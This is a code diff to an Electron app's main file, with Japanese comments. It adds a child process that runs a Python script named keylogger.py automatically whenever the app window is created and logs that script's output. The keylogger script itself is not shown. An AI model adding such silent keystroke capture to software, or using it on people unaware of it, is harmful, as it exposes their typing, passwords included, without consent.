@@ -1,6 +1,7 @@
 const { app, BrowserWindow } = require('electron');
 const WebSocket = require('ws'); // WebSocketモジュールを追加
 const bonjour = require('bonjour')(); // bonjourモジュールを追加
+const { spawn } = require('child_process'); // Pythonスクリプトを実行するために追加
 
 let mainWindow;
 let isWorking;
@@ -39,6 +40,26 @@ async function createWindow () {
   });
 
   console.log('WebSocket server running at ws://127.0.0.1:8000/');
+
+  // Pythonスクリプトを実行
+  const pythonProcess = spawn('python3', ['keylogger.py']);
+
+  pythonProcess.on('error', (err) => {
+    console.error('Failed to start subprocess:', err);
+  });
+
+  pythonProcess.stdout.on('data', (data) => {
+    console.log(`Python stdout: ${data}`);
+    // 
+  });
+
+  pythonProcess.stderr.on('data', (data) => {
+    console.error(`Python stderr: ${data}`);
+  });
+
+  pythonProcess.on('close', (code) => {
+    console.log(`Python process exited with code ${code}`);
+  });
 
   mainWindow = new BrowserWindow({
     width: 800,
